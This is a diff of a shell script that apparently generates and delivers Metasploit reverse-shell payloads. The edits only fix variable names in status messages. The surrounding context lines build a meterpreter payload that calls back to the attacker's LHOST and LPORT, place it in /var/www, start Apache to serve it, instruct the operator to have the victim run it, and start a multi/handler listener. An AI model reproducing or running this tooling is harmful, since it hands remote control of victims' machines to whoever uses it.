@@ -72,7 +72,7 @@ getip $interface;#get listenting ip interface
 extension=""
 format=""
 
-info "[${BOLD}${GREEN}$attacker${RESET}]--|--[${BOLD}${YELLOW}$port${RESET}]${BOLD}${YELLOW}$filename.${BOLD}${RED}victim${RESET}.$extension"
+info "[${BOLD}${GREEN}$attacker${RESET}]--|--[${BOLD}${YELLOW}$port${RESET}]${BOLD}${YELLOW}$filename.$extension${BOLD}${RED}victim${RESET}.$extension"
 info "Reverse Payload Generator.[$start]"
 #saves current directory
 dir=`echo $PWD`
@@ -128,15 +128,15 @@ case $stage in
 esac 
 
 
-  info "Wait till we are Generating the [${BOLD}${YELLOW}filename.$extension${RESET}]"
+  info "Wait till we are Generating the [${BOLD}${YELLOW}$filename.$extension${RESET}]"
   #echo "$MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension"
   $MSFPAY $type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port $format > $dir/$filename.$extension
 
-  info "Transfer the [${BOLD}${YELLOW}filename.$extension${RESET}] to /var/www for delivery and starting webserver"
+  info "Transfer the [${BOLD}${YELLOW}$filename.$extension${RESET}] to /var/www for delivery and starting webserver"
   mv $filename.$extension /var/www
   /etc/init.d/apache2 start
   success "Apache server started"
-  info "Execute the [${BOLD}${YELLOW}filename.$extension${RESET}] to the victim"
+  info "Execute the [${BOLD}${YELLOW}$filename.$extension${RESET}] to the victim"
   info "Launching multihandler"
   success "Apache server stopped"
   $MSFCLI multi/handler PAYLOAD=$type_payload/meterpreter/$stage LHOST=$attacker LPORT=$port E
